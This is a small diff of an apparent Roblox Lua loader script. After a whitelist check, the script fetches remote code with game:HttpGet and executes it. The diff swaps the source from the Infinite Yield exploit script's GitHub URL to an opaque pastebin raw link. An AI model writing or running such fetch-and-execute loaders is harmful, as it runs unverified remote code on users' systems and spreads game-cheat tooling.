@@ -126,7 +126,7 @@ return function(scriptKey)
         showNotification("Success", "You are whitelisted!")
 
         -- Fetch and execute the external script
-        local scriptUrl = 'https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'
+        local scriptUrl = 'https://pastebin.com/raw/xiVHqhkb'
         local scriptContent = game:HttpGet(scriptUrl)
 
         -- Safely execute the script
